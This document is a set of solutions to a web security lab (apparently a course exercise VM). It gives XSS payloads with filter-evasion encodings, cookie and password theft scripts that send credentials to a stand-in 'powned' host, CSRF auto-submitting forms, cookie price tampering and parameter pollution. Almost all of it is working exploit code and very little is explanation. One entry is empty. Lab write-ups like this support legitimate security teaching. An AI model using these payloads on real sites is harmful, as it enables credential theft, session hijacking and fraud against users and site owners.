### XSS Type 1 - Hello world!

Vulnerability: 
The browser will execute any javascript in input tag.

Exploit:

    <script>
    call_upon_injection();
    </script>

How: 
The parser in the browser will executes javascript when it sees any `<script>` tag.

### XSS Type 1 - Filtering: The Return

Exploit:

    <script>
    document.getElementById('stolen_cookie').value = document.cookie;
    </script>

How:
The default script in modern browsers is javascript so only `<script>` is enough.
Single quotes work in the same way double quotes work.

### XSS Type 1 - Filtering: The Last Stand

Exploit:

    <script>
    document.getElementById(String.fromCharCode(115, 116, 111, 108, 101, 110, 095, 099, 111, 111, 107, 105, 101)).value = document.cookie;
    </script>

How:
Generate string using ascii code to bypass the single quote and double quote filtering.

### XSS Type 1 - Filtering: Another one bites the dust

Exploit:

    <script>
    eval(unescape(/%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%73%74%6F%6C%65%6E%5F%63%6F%6F%6B%69%65%27%29%2E%76%61%6C%75%65%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B/).slice(1,-1));
    </script>

### XSS Type 1 - Filtering: Revolution

Exploit:

    <img src=wth onError=eval(unescape(/%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%73%74%6F%6C%65%6E%5F%63%6F%6F%6B%69%65%27%29%2E%76%61%6C%75%65%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B/).slice(1,-1))>

### XSS Type 1 - Filtering: The End

Exploit:

    <img src=wth onError=&#x20&#x64&#x6F&#x63&#x75&#x6D&#x65&#x6E&#x74&#x2E&#x67&#x65&#x74&#x45&#x6C&#x65&#x6D&#x65&#x6E&#x74&#x42&#x79&#x49&#x64&#x28&#x27&#x73&#x74&#x6F&#x6C&#x65&#x6E&#x5F&#x63&#x6F&#x6F&#x6B&#x69&#x65&#x27&#x29&#x2E&#x76&#x61&#x6C&#x75&#x65&#x20&#x3D&#x20&#x64&#x6F&#x63&#x75&#x6D&#x65&#x6E&#x74&#x2E&#x63&#x6F&#x6F&#x6B&#x69&#x65&#x3B>

### XSS Type 2 - Hello World

Vulnerability:
The browser will execute javascript when the code is loaded from database.

Exploit:

    <script>
    call_upon_injection();
    </script>

How:
The parser in the browser will executes javascript when it sees any `<script>` tag.

### XSS Type 2 - The iframe tag

Exploit:

    <iframe src=# onmouseover="call_upon_injection()"></iframe>


### XSS Payloads - Steal the password (Redirect)

Vulnerability:
The form's action can be changed when browser is parsing javascript in message.

Exploit:
    
    <script>
    document.forms("login").action = "http://powned/exercises/xss/giveMeThePassword.php";
    </script>

How:
The browser will execute javascript to change the action of the form so that the form will be submitted to http://powned/exercises/xss/giveMeThePassword.php.

### XSS Payloads - Steal the password (XHR)

Exploit:

    <script>
    document.forms["login"].onsubmit = function() {myFunction()};
    function myFunction() {
        var http = new XMLHttpRequest();
        var url = "http://powned/exercises/xss/giveMeThePassword.php";
        var params = "password="+document.forms["login"].password.value;
        http.open("GET", url+"?"+params, false);
        http.send(null);
    }
    </script>

### XSS Payloads - Camouflage

Exploit:

    <script>
    document.getElementById('subtitle').innerHTML = "We are pathetic and you know that!";
    document.getElementById('tr2').style.display = 'none';
    </script>

### CSRF - Zero-sum game

Exploit:

    http://webseclab-vm/exercises/csrf/csrf_basic.php?from=1&to=3

### CSRF - My POST email

Exploit:

    <form id="myForm" action="http://webseclab-vm/exercises/csrf/csrf_email_post.php" method="POST">
    <input type="hidden" name="newEmail" value="pwn5@pwnd.com"/>
    <input type="hidden" name="uid" value="1"/>
    </form>
    <script>
    document.getElementById("myForm").submit();
    window.location.replace("http://www.stanford.edu");
    </script>

### CSRF - Has my time come?

Exploit:

### Session - Protect the shop

Exploit:

    setcookie("user", $user, time()+3600, null, null, null, true);
    setcookie("price", $price, time()+3600, null, null, null, true);

### Session - Buy it cheaper #2

Exploit:

    document.cookie="price=299;";

### Session - Buy it cheaper #3

Exploit:

    var cont = 42 * 299;
    document.cookie="price=299;";
    document.cookie="control="+cont+";";

### Session - Buy it cheaper #5

Exploit:

    var cont = 24 * 6 * 299;
    document.cookie="price=299;";
    document.cookie="control="+cont+";";

### Session - Buy it cheaper #6

Exploit:

    var cont = "3956e4b5c8dc7982f985c5f495c7c49fbe95dcc7";
    document.cookie="price=299;";
    document.cookie="control="+cont+";";

### Session - Has my time come?

Exploit:

    <script>
    var d = new Date();
    var token = String(d.getTime()).slice(0,10);
    document.write(token);

    var html = '<form id="myForm" action="http://webseclab-vm/exercises/csrf/csrf_token.php" method="GET"><input type="hidden" name="token" value=' + token + '/><input type="hidden" name="from" value="1"/><input type="hidden" name="to" value="4"/><input value="Free money!" type="submit"></form>';
document.write(html);
    </script>

### Session - HTTP parameter pollution

Exploit:

    Bob&from=Alice
